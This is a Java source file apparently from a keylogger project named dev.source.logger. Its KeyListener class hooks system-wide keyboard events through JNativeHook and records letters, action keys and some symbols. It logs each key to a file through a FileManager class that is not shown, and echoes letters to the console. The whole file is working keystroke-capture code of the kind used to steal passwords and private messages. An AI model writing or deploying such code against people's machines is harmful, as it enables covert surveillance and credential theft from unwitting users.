package dev.source.logger;

import java.io.IOException;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyListener implements NativeKeyListener, AutoCloseable {
	private StringBuilder stringBuilder;
	private FileManager fileManager;

	public KeyListener() throws IOException {
		fileManager = FileManager.getInstance();
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
		if (isAction(keyEvent.getKeyCode())) {
			stringBuilder = new StringBuilder("[" + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()) + "]");
			fileManager.log(stringBuilder.toString().toUpperCase());
		}
		if (isLetter(keyEvent.getKeyCode()) || isSpecialCharacter(keyEvent.getKeyCode())) {
			fileManager.log(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
			System.out.println(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
		}
	}

	private boolean isAction(int keyCode) {
		if (keyCode == NativeKeyEvent.VC_SHIFT || keyCode == NativeKeyEvent.VC_ENTER
				|| keyCode == NativeKeyEvent.VC_SPACE || keyCode == NativeKeyEvent.VC_CAPS_LOCK) {
			return true;
		}
		return false;
	}

	private boolean isLetter(int keyCode) {
		if (keyCode == NativeKeyEvent.VC_A || keyCode == NativeKeyEvent.VC_B || keyCode == NativeKeyEvent.VC_C
				|| keyCode == NativeKeyEvent.VC_D || keyCode == NativeKeyEvent.VC_E || keyCode == NativeKeyEvent.VC_F
				|| keyCode == NativeKeyEvent.VC_G || keyCode == NativeKeyEvent.VC_H || keyCode == NativeKeyEvent.VC_I
				|| keyCode == NativeKeyEvent.VC_J || keyCode == NativeKeyEvent.VC_K || keyCode == NativeKeyEvent.VC_L
				|| keyCode == NativeKeyEvent.VC_M || keyCode == NativeKeyEvent.VC_N || keyCode == NativeKeyEvent.VC_O
				|| keyCode == NativeKeyEvent.VC_P || keyCode == NativeKeyEvent.VC_Q || keyCode == NativeKeyEvent.VC_R
				|| keyCode == NativeKeyEvent.VC_S || keyCode == NativeKeyEvent.VC_T || keyCode == NativeKeyEvent.VC_U
				|| keyCode == NativeKeyEvent.VC_V || keyCode == NativeKeyEvent.VC_W || keyCode == NativeKeyEvent.VC_X
				|| keyCode == NativeKeyEvent.VC_Y || keyCode == NativeKeyEvent.VC_Z) {
			return true;
		}
		return false;
	}

	private boolean isSpecialCharacter(int keyCode) {
		if (keyCode == NativeKeyEvent.VC_MINUS || keyCode == NativeKeyEvent.VC_UNDERSCORE) {
			return true;
		}
		return false;
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent keyEvent) {
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent keyEvent) {
	}

	@Override
	public void close() throws Exception {
		if (fileManager != null) {
			fileManager.close();
		}
	}
}
